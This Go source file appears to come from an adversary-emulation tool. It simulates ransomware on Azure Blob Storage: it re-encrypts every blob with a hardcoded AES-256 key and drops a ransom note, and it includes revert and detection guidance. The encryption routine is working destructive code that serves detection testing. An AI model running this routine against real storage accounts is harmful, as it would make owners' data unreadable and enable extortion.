package azure

import (
	"bytes"
	"context"
	_ "embed"
	"encoding/base64"
	"fmt"
	"io"
	"log"
	"strings"

	"github.com/Azure/azure-sdk-for-go/sdk/azcore/to"
	"github.com/Azure/azure-sdk-for-go/sdk/storage/azblob"
	"github.com/Azure/azure-sdk-for-go/sdk/storage/azblob/blob"
	"github.com/datadog/stratus-red-team/v2/internal/utils"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
)

//go:embed main.tf
var tf []byte

const RansomContainerName = `your-files-encrypted`
const RansomNoteFilename = `FILES-ENCRYPTED.txt`
const RansomNoteContents = `Your data has been encrypted with military-grade AES-256 encryption. To negotiate with us for the decryption key, contact evil@hackerz.io. In 7 days, if we don't hear from you, the encryption key will be destroyed and your data will be permanently lost.`

// Encryption key - 32 bytes for AES-256
var EncryptionKey = []byte("427fc7323cfb4b58f630789d37247612")
var Base64EncodedEncryptionKey = base64.StdEncoding.EncodeToString(EncryptionKey)
var EncryptionKeySHA256 = utils.SHA256HashBase64(EncryptionKey)

const CodeBlock = "```"

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "azure.impact.blob-ransomware-client-side-encryption",
		FriendlyName: "Azure Blob Storage ransomware through client-side encryption",
		Description: `
Simulates Azure Blob Storage ransomware activity that encrypts files in a storage account with a static AES-256 key through client-side encryption.

Warm-up:

- Create an Azure Storage Account
- Create multiple storage containers in the account
- Create a number of blobs in the containers with random content and file extensions

Detonation:

- Download each blob, encrypt it with a hardcoded AES-256 encryption key, and re-upload the encrypted content
- Upload a ransom note to a new container in the storage account


References:

- https://www.microsoft.com/en-us/security/blog/2025/08/27/storm-0501s-evolving-techniques-lead-to-cloud-based-ransomware/
- https://www.microsoft.com/en-us/security/blog/2025/10/20/inside-the-attack-chain-threat-activity-targeting-azure-blob-storage/
`,
		Detection: `
You can detect ransomware activity by identifying abnormal patterns of blobs being accessed, downloaded, or overwritten in a storage account.

In general, this can be done through [Blob storage events](https://learn.microsoft.com/en-us/azure/storage/blobs/storage-blob-event-overview).
Blob storage events are resource logs, which require [configuring diagnostic settings to enable](https://learn.microsoft.com/en-us/azure/storage/blobs/monitor-blob-storage?tabs=azure-portal#azure-monitor-resource-logs).

Look for suspicious patterns such as:
- High volume of GetBlob operations followed by PutBlob operations on the same files

Sample Blob storage event for <code>PutBlob</code>, shortened for readability:

` + CodeBlock + `json hl_lines="2 3 7"
{
  "operationName": "PutBlob",
  "category": "StorageWrite",
  "properties": {
    "accountName": "my-storage-account",
    "objectKey": "/my-storage-account/storage-container/encrypted-file.txt",
    "requestBodySize": 129,
    "requestHeaderSize": 692,
    "responseHeaderSize": 337
  },
  "resourceId": "/subscriptions/ac382a89-52bf-4923-8abd-f1e4791cd48f/resourceGroups/my-resource-group/providers/Microsoft.Storage/storageAccounts/my-storage-account/blobServices/default",
  "resourceType: "Microsoft.Storage/storageAccounts/blobServices"
}
` + CodeBlock + `
`,
		Platform:                   stratus.Azure,
		IsIdempotent:               false,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Impact},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	storageAccount := params["storage_account_name"]
	serviceURL := fmt.Sprintf("https://%s.blob.core.windows.net/", storageAccount)

	azureConfig := providers.Azure()
	client, err := utils.GetAzureBlobClient(serviceURL, azureConfig.SubscriptionID, azureConfig.GetCredentials(), azureConfig.ClientOptions, params)
	if err != nil {
		return fmt.Errorf("failed to instantiate Blob Client: %w", err)
	}

	log.Println("Simulating a ransomware attack on storage account " + storageAccount)

	if err := encryptAllBlobs(client); err != nil {
		return fmt.Errorf("failed to encrypt blobs in the storage account: %w", err)
	}

	log.Println("Uploading ransom note...")
	if err := utils.UploadBlob(client, RansomContainerName, RansomNoteFilename, strings.NewReader(RansomNoteContents)); err != nil {
		return fmt.Errorf("unable to create ransom note: %w", err)
	}

	log.Println("Technique execution completed")
	return nil
}

func revert(params map[string]string, providers stratus.CloudProviders) error {
	storageAccount := params["storage_account_name"]
	serviceURL := fmt.Sprintf("https://%s.blob.core.windows.net/", storageAccount)

	azureConfig := providers.Azure()
	client, err := utils.GetAzureBlobClient(serviceURL, azureConfig.SubscriptionID, azureConfig.GetCredentials(), azureConfig.ClientOptions, params)
	if err != nil {
		return fmt.Errorf("failed to instantiate Blob Client: %w", err)
	}

	log.Println("Deleting ransom note and container...")
	if err := deleteRansomNote(client); err != nil {
		return fmt.Errorf("failed to delete ransom note: %w", err)
	}

	log.Println("Decrypting all blobs in the storage account")
	if err := decryptAllBlobs(client); err != nil {
		return fmt.Errorf("failed to decrypt blobs in the storage account: %w", err)
	}

	log.Println("Cleanup completed")
	return nil
}

func encryptAllBlobs(client *azblob.Client) error {
	blobMap, err := utils.ListAllBlobVersions(client)
	if err != nil {
		return fmt.Errorf("unable to list blobs: %w", err)
	}

	totalBlobs := 0
	for _, versionMap := range blobMap {
		totalBlobs += len(versionMap)
	}

	log.Printf("Found %d blobs to encrypt across %d containers", totalBlobs, len(blobMap))
	log.Printf("Encrypting all blobs with AES-256 encryption key '%s'", Base64EncodedEncryptionKey)

	// Create CPK info for encryption
	cpkInfo := &blob.CPKInfo{
		EncryptionKey:       to.Ptr(Base64EncodedEncryptionKey),
		EncryptionKeySHA256: to.Ptr(EncryptionKeySHA256),
		EncryptionAlgorithm: to.Ptr(blob.EncryptionAlgorithmTypeAES256),
	}

	for containerName, versionMap := range blobMap {
		log.Printf("Processing container: %s", containerName)
		for blobName := range versionMap {

			downloadResp, err := client.DownloadStream(context.Background(), containerName, blobName, nil)
			if err != nil {
				return fmt.Errorf("unable to download blob %s from container %s: %w", blobName, containerName, err)
			}

			blobContent, err := io.ReadAll(downloadResp.Body)
			downloadResp.Body.Close()
			if err != nil {
				return fmt.Errorf("unable to read blob %s content: %w", blobName, err)
			}

			// Upload with CPK to encrypt
			_, err = client.UploadStream(context.Background(), containerName, blobName, bytes.NewReader(blobContent), &azblob.UploadStreamOptions{
				CPKInfo: cpkInfo,
			})
			if err != nil {
				return fmt.Errorf("unable to upload encrypted blob %s: %w", blobName, err)
			}

			log.Printf("Encrypted and uploaded blob: %s", blobName)
		}
	}

	log.Println("Successfully encrypted all blobs in the storage account")
	return nil
}

func decryptAllBlobs(client *azblob.Client) error {
	blobMap, err := utils.ListAllBlobVersions(client)
	if err != nil {
		return fmt.Errorf("unable to list blobs: %w", err)
	}

	totalBlobs := 0
	for _, versionMap := range blobMap {
		totalBlobs += len(versionMap)
	}

	log.Printf("Found %d blobs to decrypt across %d containers", totalBlobs, len(blobMap))
	log.Printf("Decrypting all blobs with AES-256 encryption key '%s'", Base64EncodedEncryptionKey)

	// Create CPK info for decryption
	cpkInfo := &blob.CPKInfo{
		EncryptionKey:       to.Ptr(Base64EncodedEncryptionKey),
		EncryptionKeySHA256: to.Ptr(EncryptionKeySHA256),
		EncryptionAlgorithm: to.Ptr(blob.EncryptionAlgorithmTypeAES256),
	}

	for containerName, versionMap := range blobMap {
		log.Printf("Processing container: %s", containerName)
		for blobName := range versionMap {
			// Download encrypted blob with CPK
			downloadResp, err := client.DownloadStream(context.Background(), containerName, blobName, &azblob.DownloadStreamOptions{
				CPKInfo: cpkInfo,
			})
			if err != nil {
				return fmt.Errorf("unable to download encrypted blob %s from container %s: %w", blobName, containerName, err)
			}

			// Read decrypted content into memory
			decryptedContent, err := io.ReadAll(downloadResp.Body)
			downloadResp.Body.Close()
			if err != nil {
				return fmt.Errorf("unable to read decrypted blob %s content: %w", blobName, err)
			}

			// Upload without CPK to store unencrypted
			_, err = client.UploadStream(context.Background(), containerName, blobName, bytes.NewReader(decryptedContent), nil)
			if err != nil {
				return fmt.Errorf("unable to upload decrypted blob %s: %w", blobName, err)
			}

			log.Printf("Decrypted and uploaded blob: %s", blobName)
		}
	}

	log.Println("Successfully decrypted all blobs in the storage account")
	return nil
}

func deleteRansomNote(client *azblob.Client) error {
	// Delete the ransom note blob
	_, err := client.DeleteBlob(context.Background(), RansomContainerName, RansomNoteFilename, nil)
	if err != nil {
		return fmt.Errorf("unable to delete ransom note blob: %w", err)
	}
	log.Printf("Deleted ransom note: %s", RansomNoteFilename)

	// Delete the ransom container
	_, err = client.DeleteContainer(context.Background(), RansomContainerName, nil)
	if err != nil {
		return fmt.Errorf("unable to delete ransom container: %w", err)
	}
	log.Printf("Deleted ransom container: %s", RansomContainerName)

	return nil
}
